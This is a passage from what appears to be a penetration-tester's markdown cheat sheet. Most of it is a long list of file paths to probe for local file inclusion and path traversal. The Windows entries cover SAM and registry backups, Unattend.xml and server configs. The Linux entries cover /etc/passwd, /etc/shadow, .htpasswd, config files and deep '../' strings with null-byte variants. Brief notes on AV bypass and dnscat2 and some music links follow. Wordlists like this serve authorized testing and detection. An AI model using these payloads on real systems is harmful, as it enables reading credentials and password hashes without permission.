        C:/Program Files (x86)/xampp/apache/conf/httpd.conf
        C:/WINDOWS/php.ini
        C:/WINDOWS/Repair/SAM
        C:/Windows/repair/system
        C:/Windows/repair/software
        C:/Windows/repair/security
        C:/WINDOWS/System32/drivers/etc/hosts
        C:/Windows/win.ini
        C:/WINNT/php.ini
        C:/WINNT/win.ini
        C:/xampp/apache/bin/php.ini
        C:/xampp/apache/logs/access.log
        C:/xampp/apache/logs/error.log
        C:/Windows/Panther/Unattend/Unattended.xml
        C:/Windows/Panther/Unattended.xml
        C:/Windows/debug/NetSetup.log
        C:/Windows/system32/config/AppEvent.Evt
        C:/Windows/system32/config/SecEvent.Evt
        C:/Windows/system32/config/default.sav
        C:/Windows/system32/config/security.sav
        C:/Windows/system32/config/software.sav
        C:/Windows/system32/config/system.sav
        C:/Windows/system32/config/regback/default
        C:/Windows/system32/config/regback/sam
        C:/Windows/system32/config/regback/security
        C:/Windows/system32/config/regback/system
        C:/Windows/system32/config/regback/software
        C:/Program Files/MySQL/MySQL Server 5.1/my.ini
        C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
        C:/Windows/System32/inetsrv/config/applicationHost.config
        C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
        d:\AppServ\MySQL
        c:\AppServ\MySQL
        c:WINDOWS/system32/
        /C:\Program Files\
        /D:\Program Files\
        /C:/inetpub/ftproot/
        ```
* Linux
    * Files
        ```
        /etc/master.passwd
        /master.passwd
        etc/passwd
        /../../../../../../../../../../../../../../../../../../../../../../etc/passwd
        /../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00
        .htpasswd
        passwd
        passwd.dat
        pass.dat
        .htpasswd
        /.htpasswd
        ../.htpasswd
        .passwd
        /.passwd
        ../.passwd
        .pass
        ../.pass
        members/.htpasswd
        member/.htpasswd
        user/.htpasswd
        users/.htpasswd
        root/.htpasswd
        db.php
        data.php
        database.asp
        database.js
        database.php
        dbase.php a
        admin/access_log
        ../users.db.php
        users.db.php
        /core/config.php
        config.php
        config.js
        ../config.js
        config.asp
        ../config.asp
        _config.php
        ../_config.php
        ../_config.php%00
        ../config.php
        config.inc.php
        ../config.inc.php
        /config.asp
        ../config.asp
        /../../../../pswd
        /admin/install.php
        ../install.php
        install.php
        /boot/grub/grub.conf
        /proc/interrupts
        /proc/cpuinfo
        /proc/meminfo
        ../apache/logs/error.log
        ../apache/logs/access.log
        ../../apache/logs/error.log
        ../../apache/logs/access.log
        ../../../apache/logs/error.log
        ../../../apache/logs/access.log
        ../../../../../../../etc/httpd/logs/acces_log
        ../../../../../../../etc/httpd/logs/acces.log
        ../../../../../../../etc/httpd/logs/error_log
        ../../../../../../../etc/httpd/logs/error.log
        ../../../../../../../var/www/logs/access_log
        ../../../../../../../var/www/logs/access.log
        ../../../../../../../usr/local/apache/logs/access_ log
        ../../../../../../../usr/local/apache/logs/access. log
        ../../../../../../../var/log/apache/access_log
        ../../../../../../../var/log/apache2/access_log
        ../../../../../../../var/log/apache/access.log
        ../../../../../../../var/log/apache2/access.log
        ../../../../../../../var/log/access_log
        ../../../../../../../var/log/access.log
        ../../../../../../../var/www/logs/error_log
        ../../../../../../../var/www/logs/error.log
        ../../../../../../../usr/local/apache/logs/error_l og
        ../../../../../../../usr/local/apache/logs/error.l og
        ../../../../../../../var/log/apache/error_log
        ../../../../../../../var/log/apache2/error_log
        ../../../../../../../var/log/apache/error.log
        ../../../../../../../var/log/apache2/error.log
        ../../../../../../../var/log/error_log
        ../../../../../../../var/log/error.log
        /etc/init.d/apache
        /etc/init.d/apache2
        /etc/httpd/httpd.conf
        /etc/apache/apache.conf
        /etc/apache/httpd.conf
        /etc/apache2/apache2.conf
        /etc/apache2/httpd.conf
        /usr/local/apache2/conf/httpd.conf
        /usr/local/apache/conf/httpd.conf
        /opt/apache/conf/httpd.conf
        /home/apache/httpd.conf
        /home/apache/conf/httpd.conf
        /etc/apache2/sites-available/default
        /etc/apache2/vhosts.d/default_vhost.include
        /etc/passwd
        /etc/shadow
        /etc/group
        /etc/security/group
        /etc/security/passwd
        /etc/security/user
        /etc/security/environ
        /etc/security/limits
        /usr/lib/security/mkuser.default
        ```


wild/rand/wtf
- av bypass / malware detection / data exfiltration (data lose prevention) / data leaks (dir listenings)
- dncat2
- ifconfig is old (https://utcc.utoronto.ca/~cks/space/blog/linux/ReplacingNetstatNotBad)


#### #Crap it music
* [kill -9](https://www.youtube.com/watch?v=0rG74rG_ubs)
* [hard bass school](https://www.youtube.com/watch?time_continue=101&v=pORLuviX-Qg)
* [night club](https://www.youtube.com/watch?v=JtYa0rb_jGQ)
* [Thunderdome](https://www.youtube.com/watch?v=4EUg-g91ql0&t=163s)
* [Linus said](https://www.youtube.com/watch?v=oHNKTlz1lps)